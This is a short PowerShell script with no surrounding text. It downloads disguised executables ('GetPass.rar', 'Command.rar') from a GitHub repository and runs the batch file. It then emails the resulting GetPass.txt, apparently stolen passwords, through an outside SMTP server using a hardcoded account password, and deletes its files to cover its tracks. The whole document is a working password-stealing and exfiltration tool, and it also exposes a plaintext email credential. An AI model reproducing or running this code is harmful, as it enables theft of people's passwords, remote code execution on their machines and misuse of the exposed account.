(new-object System.Net.WebClient).DownloadFile('https://github.com/begiilm/dy/raw/master/GetPass.rar','D:\Get.exe');
(new-object System.Net.WebClient).DownloadFile('https://github.com/begiilm/dy/raw/master/Command.rar','D:\Command.bat');
D:\Command.bat;
$mail = New-Object System.Net.Mail.MailMessage
#set the addresses
$mail.From = New-Object System.Net.Mail.MailAddress('2014111110@email.ctbu.edu.cn','2014111110@email.ctbu.edu.cn')
$mail.To.Add('2014111110@email.ctbu.edu.cn')
#set the content
$mail.Subject = 'GetPass'
$mail.Priority  = 'High'
$mail.Body = 'test'
$filename= 'D:\GetPass.txt'
$attachment = new-Object System.Net.Mail.Attachment($filename)
$mail.Attachments.Add($attachment)s
#send the message
$smtp = New-Object System.Net.Mail.SmtpClient -argumentList 'pop.exmail.qq.com'
$smtp.Credentials = New-Object System.Net.NetworkCredential -argumentList '2014111110@email.ctbu.edu.cn','Aictbu123'
$smtp.EnableSsl = 'True';
$smtp.Timeout = '10000000';
try{
	$smtp.Send($mail)
	echo 'Ok,Send succed!'
}
catch 
{
	echo 'Error!Filed!'
}
remove-item 'D:\GetPass.txt'
remove-item 'D:\Get.exe'
remove-item 'D:\Command.bat'
